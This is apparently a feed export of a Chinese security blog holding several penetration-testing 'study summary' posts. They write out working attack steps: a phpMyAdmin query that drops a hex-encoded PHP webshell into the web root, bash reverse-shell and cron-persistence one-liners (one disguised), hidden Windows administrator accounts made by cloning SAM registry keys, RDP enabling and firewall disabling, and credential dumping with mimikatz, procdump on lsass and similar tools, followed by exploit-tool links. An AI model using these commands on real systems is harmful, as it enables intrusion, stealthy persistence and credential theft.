安全狗导出WebShell<br>以上的三个文件的作用是（执行SQL语句）<br>但是如果被删除了可以通过以下的方法</p><ul><li>token需要</li><li>自己选择一个数据库和数据表</li><li>参数pos=0</li></ul><pre><code>&amp;sql_query=/*!50001select*/ 0x3c3f7068702024613d636f6e766572745f75756465636f646528222638372d5339372954206022293b40246128245f504f53545b27212a21275d293b3f3e into outfile &#39;C:\\phpStudy\\WWW\\bypass.php&#39;;</code></pre><p>例如</p><pre><code>http://127.0.0.1/phpmyadmin/sql.php?db=数据库名&amp;token=token值&amp;table=数据表名&amp;pos=0&amp;sql_query=/*!50001select*/ 0x3c3f7068702024613d636f6e766572745f75756465636f646528222638372d5339372954206022293b40246128245f504f53545b27212a21275d293b3f3e into outfile &#39;C:\\phpStudy\\WWW\\bypass.php&#39;;</code></pre><h2 id="特殊版本GetShell"><a href="#特殊版本GetShell" class="headerlink" title="特殊版本GetShell"></a>特殊版本GetShell</h2><p><strong>CVE-2013-3238</strong></p><blockquote><p>影响版本：3.5.x &lt; 3.5.8.1 and 4.0.0 &lt; 4.0.0-rc3 ANYUN.ORG</p><p>利用模块：exploit/multi/http/phpmyadminpregreplace</p></blockquote><p><strong>CVE-2012-5159</strong></p><blockquote><p>影响版本：phpMyAdmin v3.5.2.2</p><p>利用模块：exploit/multi/http/phpmyadmin3522_backdoor</p></blockquote><p><strong>CVE-2009-1151</strong></p><blockquote><p>PhpMyAdmin配置文件/config/config.inc.php存在命令执行</p><p>影响版本：2.11.x &lt; 2.11.9.5 and 3.x &lt; 3.1.3.1</p><p>利用模块：exploit/unix/webapp/phpmyadmin_config</p></blockquote><p><strong>弱口令&amp;万能密码</strong></p><blockquote><p>弱口令：版本phpmyadmin2.11.9.2， 直接root用户登陆，无需密码</p><p>万能密码：版本2.11.3 / 2.11.4，用户名‘localhost’@‘@”则登录成功</p></blockquote><h1 id="0x03-CMS-GetShell"><a href="#0x03-CMS-GetShell" class="headerlink" title="0x03 CMS GetShell"></a>0x03 CMS GetShell</h1><h2 id="WordPress-1"><a href="#WordPress-1" class="headerlink" title="WordPress"></a>WordPress</h2><p><a href="https://dylan903.coding.me/2019/11/06/wordpress-hou-tai-getshell-zong-jie/">Wordpress 后台GetShell总结</a></p><h1 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h1><p><a href="https://bbs.ichunqiu.com/thread-19893-1-1.html" target="_blank" rel="noopener">PhpMyAdmin 网站路径信息获取</a><br><a href="https://blog.csdn.net/q1352483315/article/details/88904001" target="_blank" rel="noopener">总结下写phpmyadmin写shell的方法</a><br><a href="https://xz.aliyun.com/t/3283" target="_blank" rel="noopener">phpmyadmin getshell姿势 - 先知社区</a></p>]]></content>
      
      
      <categories>
          
          <category> summary </category>
          
      </categories>
      
      
        <tags>
            
            <tag> GetShell </tag>
            
            <tag> summary </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>学习总结篇—Linux</title>
      <link href="/2019/08/27/xue-xi-zong-jie-pian-linux/"/>
      <url>/2019/08/27/xue-xi-zong-jie-pian-linux/</url>
      
        <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p> Linux渗透测试总结</p><h1 id="bash"><a href="#bash" class="headerlink" title="bash"></a>bash</h1><pre><code>`bash -i &gt;&amp; /dev/tcp/10.0.0.1/8080 0&gt;&amp;1``bash -i`                   #交互的 shell `&amp;`                         #标准错误输出到标准输出`/dev/tcp/10.0.0.1/8080`    #建立 socket ip port`0&gt;&amp;1`                      #标准输入到标准输出</code></pre><pre><code>(crontab -l;echo &#39;*/60 * * * * exec 9&lt;&gt; /dev/tcp/IP/port;exec 0&lt;&amp;9;exec 1&gt;&amp;9 2&gt;&amp;1;/bin/bash --noprofile -i&#39;)|crontab -</code></pre><h2 id="猥琐版"><a href="#猥琐版" class="headerlink" title="猥琐版"></a>猥琐版</h2><pre><code>(crontab -l;printf &quot;*/60 * * * * exec 9&lt;&gt; /dev/tcp/IP/PORT;exec 0&lt;&amp;9;exec 1&gt;&amp;9 2&gt;&amp;1;/bin/bash --noprofile -i;\rno crontab for whoami%100c\n&quot;)|crontab -</code></pre><p>详细介绍：<br><a href="https://github.com/dylan903/security_circle_2017/blob/master/15288418585142.md" target="_blank" rel="noopener">https://github.com/dylan903/security_circle_2017/blob/master/15288418585142.md</a></p><h1 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h1><p><a href="https://blog.csdn.net/qq_33020901/article/details/80547964" target="_blank" rel="noopener">史上最强内网渗透知识点总结</a></p>]]></content>
      
      
      <categories>
          
          <category> summary </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Linux </tag>
            
            <tag> summary </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>学习总结篇—Windows</title>
      <link href="/2019/08/26/xue-xi-zong-jie-pian-windows/"/>
      <url>/2019/08/26/xue-xi-zong-jie-pian-windows/</url>
      
        <content type="html"><![CDATA[<h1 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h1><p>Windows内网渗透总结。</p><h1 id="0x01-常用命令"><a href="#0x01-常用命令" class="headerlink" title="0x01 常用命令"></a>0x01 常用命令</h1><pre><code>dirmkdirrdrd /s D:\test   删除D盘里的test文件夹  会出现如下 test, 是否确认(Y/N)?  直接输入 Y 在回车rd test/s       删除此文件夹下的所有文件  test, 是否确认(Y/N)?  直接输入 Y 在回车cd .&gt;1.txt   创建1.txt  空文件cd &gt;1.txt  创建1.txt  文件内包含当前路径type nul&gt;1.txt  创建空文件echo 123&gt;1.txtdel 1.txtmore 1.txt  查看文件内容netstat -ano | findstr 8080  根据端口找进程tasklist | findstr 进程号tasklist /svc  显示每个进程中的服务信息，当/fo参数设置为table时有效。taskkill /pid 进程号query user || qwinsta 查看当前在线用户Lusrmgr.msc  用户和组管理图形界面net user  查看本机用户net user /domain 查看域用户net view &amp; net group &quot;domain computers&quot; /domain 查看当前域计算机列表 第二个查的更多net view /domain 查看有几个域net view \\\\dc   查看 dc 域内共享文件net group /domain 查看域里面的组net group &quot;domain admins&quot; /domain 查看域管net localgroup administrators /domain   /这个也是查域管，是升级为域控时，本地账户也成为域管net group &quot;domain controllers&quot; /domain 域控net time /domain net config workstation   当前登录域 - 计算机名 - 用户名net use \\\\域控(如pc.xx.com) password /user:xxx.com\username 相当于这个帐号登录域内主机，可访问资源ipconfigsysteminfotasklist /svctasklist /S ip /U domain\username /P /V 查看远程计算机 tasklistnet localgroup administrators &amp;&amp; whoami 查看当前是不是属于管理组netstat -anonltest /dclist:xx  查看域控whoami /all 查看 Mandatory Label uac 级别和 sid 号net sessoin 查看远程连接 session (需要管理权限)net share     共享目录cmdkey /l   查看保存登陆凭证echo %logonserver%  查看登陆域spn –l administrator spn 记录set  环境变量dsquery server - 查找目录中的 AD DC/LDS 实例dsquery user - 查找目录中的用户dsquery computer 查询所有计算机名称 windows 2003dir /s *.exe 查找指定目录下及子目录下没隐藏文件arp -a</code></pre><h1 id="0x02-新建用户"><a href="#0x02-新建用户" class="headerlink" title="0x02 新建用户"></a>0x02 新建用户</h1><h2 id="基本命令"><a href="#基本命令" class="headerlink" title="基本命令"></a>基本命令</h2><pre><code>net user temp temp2005 /addnet localgroup administrators temp /add</code></pre><p>system权限3389无法添加的用户情况:<br><a href="http://www.91ri.org/5866.html" target="_blank" rel="noopener">解决system权限3389无法添加的用户情况</a></p><h2 id="常见的账户隐藏手法"><a href="#常见的账户隐藏手法" class="headerlink" title="常见的账户隐藏手法"></a>常见的账户隐藏手法</h2><h3 id="命令行隐藏手法"><a href="#命令行隐藏手法" class="headerlink" title="命令行隐藏手法"></a>命令行隐藏手法</h3><p>优点：简单、快捷、不需要花里胡哨的东西。一条命令搞定。<br>缺点：只限于不被cmd命令行模式发现用户，容易被稍有经验的人发现</p><p><code>net user 用户名$ /add</code></p><h3 id="注册表隐藏手法"><a href="#注册表隐藏手法" class="headerlink" title="注册表隐藏手法"></a>注册表隐藏手法</h3><p>优点：不易被发现。<br>缺点：注册表可见。</p><ul><li>修改权限</li></ul><p>默认注册表<code>HKEY_LOCAL_MACHINE\SAM\SAM\</code>只有<code>system</code>权限才能修改<br>现在需要为其添加管理员权限<br>右键-权限-选中<code>Administrators</code>，允许完全控制<br>重新启动注册表<code>regedit.exe</code>，获得对该键值的修改权限</p><ul><li>新建特殊账户</li></ul><pre><code>net user test$ 123456 /addnet localgroup administrators test$ /add</code></pre><ul><li>导出注册表</li></ul><p>在注册表<code>HKEY_LOCAL_MACHINE\SAM\SAM\Domains\Account\Users\Names</code>下找到新建的帐户<code>test$</code><br>获取默认类型为<code>0x3ea</code></p><p>将注册表<code>HKEY_LOCAL_MACHINE\SAM\SAM\Domains\Account\Users\Names\test$</code>导出为<code>1.reg</code></p><p>在注册表下能够找到<code>对应类型名称</code>的注册表项</p><p><code>HKEY_LOCAL_MACHINE\SAM\SAM\Domains\Account\Users\000003EA</code></p><p>右键将该键导出为<code>2.reg</code>，保存的文件信息如下图</p><p>默认情况下，管理员帐户<code>Administrator</code>对应的注册表键值为<br><code>HKEY_LOCAL_MACHINE\SAM\SAM\Domains\Account\Users\000001F4</code></p><p>同样，右键将该键导出为<code>3.reg</code></p><p>将注册表项<code>HKEY_LOCAL_MACHINE\SAM\SAM\Domains\Account\Users\000003EA</code>下键<code>F</code>的值替换为<br><code>HKEY_LOCAL_MACHINE\SAM\SAM\Domains\Account\Users\000001F4</code>下键<code>F</code>的值<br>即<code>2.reg</code>中键F的值替换成<code>3.reg</code>中键<code>F</code>的值</p><pre><code>net user test$ /delregedit /s 1.regregedit /s 2.reg</code></pre><p>隐藏账户制做完成，控制面板不存在帐户<code>test$</code><br>通过<code>net user</code>无法列出该帐户<br>计算机管理-本地用户和组-用户也无法列出该帐户</p><p>但可通过如下方式查看：</p><p><code>net user test$</code></p><p>无法通过<code>net user test$ /del</code>删除该用户，<br>提示用户不属于此组<br>删除方法：<br>删除注册表<code>HKEY_LOCAL_MACHINE\SAM\SAM\Domains\Account\Users\</code>下对应帐户的键值<strong>(共有两处)</strong></p><h1 id="0x03-开启rdp端口"><a href="#0x03-开启rdp端口" class="headerlink" title="0x03 开启rdp端口"></a>0x03 开启rdp端口</h1><p>查询系统是否允许3389远程连接,1表示关闭，0表示开启</p><p><code>REG QUERY &quot;HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server&quot; /v fDenyTSConnections</code></p><p>查看远程连接的端口,端口格式为16进制</p><p><code>REG QUERY &quot;HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp&quot; /v PortNumber</code></p><p>开启远程桌面</p><pre><code>REG ADD &quot;HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server&quot; /v fDenyTSConnections /t REG_DWORD /d 00000000 /fREG ADD &quot;HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp&quot; /v PortNumber /t REG_DWORD /d 0x00000d3d /f</code></pre><p>如果端口被更改</p><p><code>tasklist /svc</code>。<br>查看svchost有不有termservice服务,有的话记住pid<br>然后<code>netstat -ano</code>找到pid对应的端口就行了</p><p>如果系统未配置过远程桌面服务，第一次开启时还需要添加防火墙规则，允许 3389 端口，命令如下:</p><pre><code>netsh advfirewall firewall add rule name=&quot;Remote Desktop&quot; protocol=TCP dir=in localport=3389 action=allow</code></pre><p>关闭防火墙</p><p><code>netsh firewall set opmode mode=disable</code></p><h1 id="0x04-抓取管理员密码"><a href="#0x04-抓取管理员密码" class="headerlink" title="0x04 抓取管理员密码"></a>0x04 抓取管理员密码</h1><h2 id="1、mimikatz-trunk工具"><a href="#1、mimikatz-trunk工具" class="headerlink" title="1、mimikatz_trunk工具"></a>1、mimikatz_trunk工具</h2><h3 id="mimikatz-trunk工具抓取密码"><a href="#mimikatz-trunk工具抓取密码" class="headerlink" title="mimikatz_trunk工具抓取密码"></a>mimikatz_trunk工具抓取密码</h3><pre><code>privilege::debug    # 提升权限sekurlsa::logonpasswords   #获取密码</code></pre><h3 id="抓取密码为空"><a href="#抓取密码为空" class="headerlink" title="抓取密码为空"></a>抓取密码为空</h3><p>当系统为<strong>win10</strong>或<strong>2012R2</strong>以上时，默认在内存缓存中禁止保存明文密码，<br>此时可以通过修改注册表的方式抓取明文，但需要用户<strong>重新登录</strong>后才能成功抓取。</p><pre><code>reg add hklm\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /t REG_DWORD /d 1 /f</code></pre><p>当我们不需要存储明文密码的时候，我们可以将上述命令中的<code>REG_DWORD</code>的值修改为<code>0</code>即可。</p><h3 id="导出sam的Hash"><a href="#导出sam的Hash" class="headerlink" title="导出sam的Hash"></a>导出sam的Hash</h3><p>还可以利用mimikatz在线导出sam的Hash</p><pre><code>log res.txtprivilege::debugtoken::elevatelsadump::sam</code></pre><p>当我们获取到hash值后，我们通过破解hash值来获取明密码，<br>用hashcat直接跑，字典越大跑出来的几率就越大；</p><h3 id="配合Procdump抓取密码"><a href="#配合Procdump抓取密码" class="headerlink" title="配合Procdump抓取密码"></a>配合Procdump抓取密码</h3><p>首先我们先用procdum这款工具下载lsass进程的内存，<br>这个工具一般不会被AV查杀的，这款工具也分为32位和64位两个版本。</p><p>执行下载lsass进程内存的命令</p><p><code>procdump64.exe -accepteula -ma lsass.exe</code> </p><p>执行完毕后，在当前目录下会生成一个<code>lsass.dmp</code>的文件，这个文件是我们需要的文件：</p><p>将这个文件放在mimikatz目录下，然后启动mimikatz.exe，<br>执行<code>sekurlsa::minidump lsass.exe_190310_001506.dmp</code></p><p>执行读取密码的命令</p><p><code>sekurlsa::tspkg</code></p><h2 id="2、WCE"><a href="#2、WCE" class="headerlink" title="2、WCE"></a>2、WCE</h2><h3 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h3><p>这款工具是一款Hash注入神器，不仅可以用于Hash注入，也可以直接获取明文或Hash。<br>这款工具也分为32位和64位两个不同的版本</p><pre><code>参数解释:-l 列出登录的会话和NTLM凭据（默认值）；-s 修改当前登录会话的NTLM凭据 参数：&lt;用户名&gt;:&lt;域名&gt;:&lt;LM哈希&gt;:&lt;NT哈希&gt;；-r 不定期的列出登录的会话和NTLM凭据，如果找到新的会话，那么每5秒重新列出一次；-c 用一个特殊的NTML凭据运行一个新的会话 参数：&lt;cmd&gt;；-e 不定期的列出登录的会话和NTLM凭据，当产生一个登录事件的时候重新列出一次；-o 保存所有的输出到一个文件 参数:&lt;文件名&gt;；-i 指定一个LUID代替使用当前登录会话 参数:&lt;luid&gt;。-d 从登录会话中删除NTLM凭据 参数:&lt;luid&gt;；-a 使用地址 参数: &lt;地址&gt;；-f 强制使用安全模式-g 生成LM和NT的哈希 参数&lt;密码&gt;-f 强制使用安全模式；希 参数&lt;密码&gt;；（unix和windows wce格式）；；；-k 从一个文件中读取kerberos票据并插入到windows缓存中-k 从一个文件中读取kerberos票据并插入到windows缓存中；-v 详细输出；</code></pre><h3 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h3><p>抓取用户的明文密码</p><p><code>Wce.exe -w</code></p><p>抓取hash值</p><p><code>wce.exe -l</code></p><p><code>wce.exe -w &gt; hash.txt   #保存在txt文档</code></p><h2 id="2、Nishang"><a href="#2、Nishang" class="headerlink" title="2、Nishang"></a>2、Nishang</h2><h3 id="简介-1"><a href="#简介-1" class="headerlink" title="简介"></a>简介</h3><p><a href="https://github.com/samratashok/nishang" target="_blank" rel="noopener">Nishang</a>是一款针对PowerShell的渗透工具，<br>除了可以抓取密码还可以进行端口扫描、提权、密码爆破等功能，<br>这款工具依赖系统权限（有点小瑕疵）。</p><h3 id="使用-1"><a href="#使用-1" class="headerlink" title="使用"></a>使用</h3><p>Posershell既然是一个框架，那我们需要将nishang导入到这个框架当中，运行脚本需要一定的权限，<br><code>powershell</code>默认的执行策略是<code>Restricted</code>，这个<code>Restricted</code>是不允许运行任何脚本的。<br>在<code>PowerShell</code>执行</p><p><code>Get-ExecutionPolicy   #命令来查看默认的策略组</code><br><code>Set-ExecutionPolicy remotesigned    #将策略值改为remotesigned,这样我们就可以运行脚本</code></p><p>下载的<code>nishang</code>，继续执行</p><pre><code>Import-Module .\nishang\nishang.psm1   #导入Get-PassHashes   # 抓取hash值powershell –exec bypass –Command &quot;&amp; {Import-Module&#39;C:\Windows\System32\WindowsPowerShell\v1.0\nishang\Gather\Invoke-Mimikatz.ps1&#39;;Invoke-Mimikatz}&quot;# 抓取明文密码</code></pre><h2 id="3、Quarks-PwDump"><a href="#3、Quarks-PwDump" class="headerlink" title="3、Quarks PwDump"></a>3、Quarks PwDump</h2><h3 id="简介-2"><a href="#简介-2" class="headerlink" title="简介"></a>简介</h3><p>Quarks PwDump 是一款开放源代码的Windows用户凭据提取工具，<br>它可以抓取windows平台下多种类型的用户凭据，包括：本地帐户、域帐户、缓存的域帐户和Bitlocker。</p><p>QuarksPwDump.exe参数说明：</p><pre><code>-dhl 导出本地哈希值-dhdc导出内存中的域控哈希值-dhd 导出域控哈希值，必须指定NTDS文件-db 导出Bitlocker信息，必须指定NTDS文件-nt 导出ntds文件-hist 导出历史信息，可选项-t 导出类型可选默认导出为John类型。-o 导出文件到本地</code></pre><h3 id="使用-2"><a href="#使用-2" class="headerlink" title="使用"></a>使用</h3><p>执行抓取用户密码的命令</p><p><code>quarksPwDump.exe --dump-hash-local -o hash.txt</code></p><p>我们将抓取到的本地用户的密码保存到本地目录下的hash.txt中,保存的位置以及文件名自己可以设置:</p><h2 id="4、LaZagne"><a href="#4、LaZagne" class="headerlink" title="4、LaZagne"></a>4、LaZagne</h2><h3 id="简介-3"><a href="#简介-3" class="headerlink" title="简介"></a>简介</h3><p>LaZagne是一款用于检索大量存储在本地计算机密码的开源应用程序。<br>该工具通过python开发，易读、易维护，依赖的python2版本,<br>这款工具不仅能抓取用户密码，还可以抓取浏览器中的缓存的密码、SVN密码、<br>wifi密码、邮箱密码等功能，这款工具不经适用于windows，也可以适用于Linux、MAC。</p><p><a href="https://www.4hou.com/tools/7404.html" target="_blank" rel="noopener">本地密码查看工具LaZagne中的自定义脚本开发</a></p><h3 id="使用-3"><a href="#使用-3" class="headerlink" title="使用"></a>使用</h3><p><code>lazagne.exe windows</code></p><h2 id="5、Getpass"><a href="#5、Getpass" class="headerlink" title="5、Getpass"></a>5、Getpass</h2><h3 id="简介-4"><a href="#简介-4" class="headerlink" title="简介"></a>简介</h3><p>这款工具由闪电小子根据mimikatz编译的一个工具，<br>双击运行或者在cmd运行可以直接获取明文密码，有的时候需要自己做免杀处理。</p><h2 id="6、Pwdump7"><a href="#6、Pwdump7" class="headerlink" title="6、Pwdump7"></a>6、Pwdump7</h2><h3 id="简介-5"><a href="#简介-5" class="headerlink" title="简介"></a>简介</h3><p>Pwdump 7是一个免费的Windows实用程序，它能够提取出Windows系统中的口令，并存储在指定的文件中。<br>Pwdump7是Pwdump3e的改进版，该程序能够从Windows目标中提取出NTLM和LanMan口令散列值，<br>而不管是否启用了Syskey（这是一个Windows账户数据库加密工具，是Windows下的一条命令）。</p><h3 id="使用-4"><a href="#使用-4" class="headerlink" title="使用"></a>使用</h3><p>这款工具使用比较方便，直接在<code>dos</code>命令中执行<code>pwdump7.exe</code>，就可以直接抓取密码，<br>如不愿意输出到桌面，可以执行</p><p><code>pwdump7.exe &gt; hash.txt</code></p><h1 id="0x05-打扫战场"><a href="#0x05-打扫战场" class="headerlink" title="0x05 打扫战场"></a>0x05 打扫战场</h1><h1 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h1><p><a href="https://mp.weixin.qq.com/s?__biz=MzAxMjE3ODU3MQ==&mid=2650456541&idx=3&sn=f7543b13db64961c6f947a2327c58254" target="_blank" rel="noopener">详解Windows隐藏账户的常规手法及原理</a><br><a href="https://3gstudent.github.io/3gstudent.github.io/渗透技巧-Windows系统的帐户隐藏/" target="_blank" rel="noopener">渗透技巧——Windows系统的帐户隐藏</a><br><a href="https://blog.csdn.net/qq_33020901/article/details/80547964" target="_blank" rel="noopener">史上最强内网渗透知识点总结</a></p>]]></content>
      
      
      <categories>
          
          <category> summary </category>
          
      </categories>
      
      
        <tags>
            
            <tag> summary </tag>
            
            <tag> Windows </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>学习总结篇—漏洞利用</title>
      <link href="/2019/08/24/xue-xi-zong-jie-pian-lou-dong-li-yong/"/>
      <url>/2019/08/24/xue-xi-zong-jie-pian-lou-dong-li-yong/</url>
      
        <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><hr><p>漏洞整合利用。</p><h1 id="漏洞库"><a href="#漏洞库" class="headerlink" title="漏洞库"></a>漏洞库</h1><hr><ul><li>ExploitDB官方git版本:<br><a href="https://github.com/offensive-security/exploit-database" target="_blank" rel="noopener">https://github.com/offensive-security/exploit-database</a></li></ul><h1 id="CMS"><a href="#CMS" class="headerlink" title="CMS"></a>CMS</h1><hr><h2 id="discuz"><a href="#discuz" class="headerlink" title="discuz"></a>discuz</h2><ul><li>DISCUZ漏洞扫描器：<br><a href="https://github.com/code-scan/dzscan" target="_blank" rel="noopener">https://github.com/code-scan/dzscan</a></li></ul><h2 id="泛微OA"><a href="#泛微OA" class="headerlink" title="泛微OA"></a>泛微OA</h2><ul><li><p><a href="https://3h85yh.coding-pages.com/2019/10/10/fan-wei-oa-workflowcentertreedata-jie-kou-zhu-ru-lou-dong-fu-xian/" target="_blank" rel="noopener">泛微OA WorkflowCenterTreeData接口注入漏洞</a></p></li><li><p><a href="https://3h85yh.coding-pages.com/2019/10/28/fan-wei-ecology-oa-shu-ju-ku-pei-zhi-xin-xi-xie-lu-lou-dong-fu-xian/" target="_blank" rel="noopener">泛微ecology OA数据库配置信息泄露漏洞复现</a></p></li></ul><h2 id="海洋cms-SEACMS"><a href="#海洋cms-SEACMS" class="headerlink" title="海洋cms(SEACMS)"></a>海洋cms(SEACMS)</h2><ul><li><a href="https://3h85yh.coding-pages.com/2019/11/04/hai-yang-cms-v6.53-v6.54-ming-ling-zhi-xing-lou-dong-fu-xian/" target="_blank" rel="noopener">海洋cms(SEACMS) 漏洞整合复现</a></li></ul><h2 id="Maccms"><a href="#Maccms" class="headerlink" title="Maccms"></a>Maccms</h2><ul><li><a href="https://3h85yh.coding-pages.com/2019/11/04/maccms8.x-ming-ling-zhi-xing-lou-dong-fu-xian-ping-guo-cms/" target="_blank" rel="noopener"> Maccms8.x(苹果cms)命令执行漏洞复现</a></li></ul><h2 id="ThinkCMF"><a href="#ThinkCMF" class="headerlink" title="ThinkCMF"></a>ThinkCMF</h2><ul><li>ThinkCMF框架任意内容包含漏洞复现<br><a href="https://3h85yh.coding-pages.com/2019/10/24/thinkcmf-kuang-jia-ren-yi-nei-rong-bao-han-lou-dong-fu-xian/" target="_blank" rel="noopener">https://3h85yh.coding-pages.com/2019/10/24/thinkcmf-kuang-jia-ren-yi-nei-rong-bao-han-lou-dong-fu-xian/</a></li></ul><h2 id="ThinkPHP"><a href="#ThinkPHP" class="headerlink" title="ThinkPHP"></a>ThinkPHP</h2><ul><li><p>TPscan: 一键ThinkPHP漏洞检测<br><a href="https://github.com/dylan903/TPscan" target="_blank" rel="noopener">https://github.com/dylan903/TPscan</a></p></li><li><p>关于ThinkPHP框架的历史漏洞分析集合<br><a href="https://github.com/Mochazz/ThinkPHP-Vuln" target="_blank" rel="noopener">ThinkPHP-Vuln</a> </p></li><li><p>Thinkphp5.x 全版本通杀漏洞分析<br><a href="https://mp.weixin.qq.com/s?__biz=MzAxMjE3ODU3MQ==&mid=2650451917&idx=1&sn=a76fc19c079b8871174166ffdfc43eb5" target="_blank" rel="noopener">https://mp.weixin.qq.com/s?__biz=MzAxMjE3ODU3MQ==&amp;mid=2650451917&amp;idx=1&amp;sn=a76fc19c079b8871174166ffdfc43eb5</a></p></li><li><p>Thinkphp V5.X 远程代码执行漏洞-POC 集合<br><a href="https://mp.weixin.qq.com/s?__biz=MzAxMjE3ODU3MQ==&mid=2650455051&idx=3&sn=d6fb1bbe7950f0f43b9794b7e02cd30f" target="_blank" rel="noopener">https://mp.weixin.qq.com/s?__biz=MzAxMjE3ODU3MQ==&amp;mid=2650455051&amp;idx=3&amp;sn=d6fb1bbe7950f0f43b9794b7e02cd30f</a></p></li><li><p>ThinkPHP5.x.x各版本实战环境getshell<br><a href="https://mp.weixin.qq.com/s?__biz=MzAxMjE3ODU3MQ==&mid=2650457884&idx=2&sn=ebeb0978de0db5e56da63edcc35db9ee" target="_blank" rel="noopener">https://mp.weixin.qq.com/s?__biz=MzAxMjE3ODU3MQ==&amp;mid=2650457884&amp;idx=2&amp;sn=ebeb0978de0db5e56da63edcc35db9ee</a></p></li></ul><h2 id="Vbulletin"><a href="#Vbulletin" class="headerlink" title="Vbulletin"></a>Vbulletin</h2><ul><li>Identify vulnerable (RCE) vBulletin 5.0.0 - 5.5.4 instances using Shodan (CVE-2019-16759)<br><a href="https://github.com/Frint0/mass-pwn-vbulletin" target="_blank" rel="noopener">https://github.com/Frint0/mass-pwn-vbulletin</a></li></ul><h2 id="Wordpress"><a href="#Wordpress" class="headerlink" title="Wordpress"></a>Wordpress</h2><ul><li><p>WPScan is a free, for non-commercial use, black box WordPress Vulnerability Scanner<br>written for security professionals and blog maintainers to test the security of their WordPress websites.<br><a href="https://github.com/dylan903/wpscan" target="_blank" rel="noopener">https://github.com/dylan903/wpscan</a></p></li><li><p>WPSeku：一款用于WordPress漏洞扫描的安全程序。<br><a href="https://github.com/m4ll0k/WPSeku" target="_blank" rel="noopener">https://github.com/m4ll0k/WPSeku</a></p></li><li><p>shack2/WPCracker: WPCracker弱口令探测<br><a href="https://github.com/shack2/WPCracker" target="_blank" rel="noopener">https://github.com/shack2/WPCracker</a></p></li><li><p>Wordpress未授权访问漏洞复现(CVE-2019-17671)<br><a href="https://3h85yh.coding-pages.com/2019/11/04/wordpress-wei-shou-quan-fang-wen-lou-dong-fu-xian-cve-2019-17671/" target="_blank" rel="noopener">https://3h85yh.coding-pages.com/2019/11/04/wordpress-wei-shou-quan-fang-wen-lou-dong-fu-xian-cve-2019-17671/</a></p></li><li><p>wordpress-exploit-framework: A Ruby framework designed to aid in the penetration testing of WordPress systems.<br><a href="https://github.com/rastating/wordpress-exploit-framework" target="_blank" rel="noopener">https://github.com/rastating/wordpress-exploit-framework</a></p></li><li><p>WPForce: Wordpress Attack Suite<br><a href="https://github.com/n00py/WPForce" target="_blank" rel="noopener">https://github.com/n00py/WPForce</a></p></li></ul><h1 id="Java"><a href="#Java" class="headerlink" title="Java"></a>Java</h1><hr><ul><li><p>JAVA反序列化POC生成工具<br><a href="https://github.com/frohoff/ysoserial" target="_blank" rel="noopener">https://github.com/frohoff/ysoserial</a></p></li><li><p>JAVA反序列化EXP<br><a href="https://github.com/foxglovesec/JavaUnserializeExploits" target="_blank" rel="noopener">https://github.com/foxglovesec/JavaUnserializeExploits</a></p></li></ul><h1 id="JBoss"><a href="#JBoss" class="headerlink" title="JBoss"></a>JBoss</h1><hr><p>JBOSS一键检测工具<br>Jboss (and Java Deserialization Vulnerabilities) verify and EXploitation Tool<br><a href="https://github.com/dylan903/jexboss" target="_blank" rel="noopener">https://github.com/dylan903/jexboss</a></p><h1 id="linux"><a href="#linux" class="headerlink" title="linux"></a>linux</h1><hr><ul><li><p>linux漏洞扫描<br><a href="https://github.com/future-architect/vuls" target="_blank" rel="noopener">https://github.com/future-architect/vuls</a></p></li><li><p>CentOS-Control-Web-Panel-CVE(CentOS Web面板0.9.8.836 - 0.9.8.847)<br><a href="https://github.com/i3umi3iei3ii/CentOS-Control-Web-Panel-CVE" target="_blank" rel="noopener">https://github.com/i3umi3iei3ii/CentOS-Control-Web-Panel-CVE</a></p></li></ul><h1 id="PHP"><a href="#PHP" class="headerlink" title="PHP"></a>PHP</h1><hr><ul><li>PHP-FPM在Nginx特定配置下远程代码执行漏洞复现<br><a href="https://3h85yh.coding-pages.com/2019/10/23/php-fpm-zai-nginx-te-ding-pei-zhi-xia-yuan-cheng-dai-ma-zhi-xing-lou-dong-fu-xian/" target="_blank" rel="noopener">https://3h85yh.coding-pages.com/2019/10/23/php-fpm-zai-nginx-te-ding-pei-zhi-xia-yuan-cheng-dai-ma-zhi-xing-lou-dong-fu-xian/</a></li></ul><ul><li><p>php漏洞代码分析：<br><a href="https://github.com/80vul/phpcodz" target="_blank" rel="noopener">https://github.com/80vul/phpcodz</a></p></li><li><p>php7缓存覆写漏洞Demo及相关工具<br><a href="https://github.com/GoSecure/php7-opcache-override" target="_blank" rel="noopener">https://github.com/GoSecure/php7-opcache-override</a></p></li></ul><h1 id="PHPSutdy"><a href="#PHPSutdy" class="headerlink" title="PHPSutdy"></a>PHPSutdy</h1><hr><ul><li>phpstudy后门漏洞利用工具-本工具支持单url检测，cmdshell，get web shell（写入一句话木马），批量检测。<br><a href="https://github.com/theLSA/phpstudy-backdoor-rce" target="_blank" rel="noopener">https://github.com/theLSA/phpstudy-backdoor-rce</a></li></ul><h1 id="Redis"><a href="#Redis" class="headerlink" title="Redis"></a>Redis</h1><hr><ul><li>Redis未授权一键检测工具<br> Prometheus Exporter for Redis Metrics. Supports Redis 2.x, 3.x, 4.x, and 5.x<br><a href="https://github.com/dylan903/redis_exporter" target="_blank" rel="noopener">https://github.com/dylan903/redis_exporter</a></li></ul><h1 id="Solr"><a href="#Solr" class="headerlink" title="Solr"></a>Solr</h1><hr><ul><li>apache_solr_via_velocity_template_rce复现<br><a 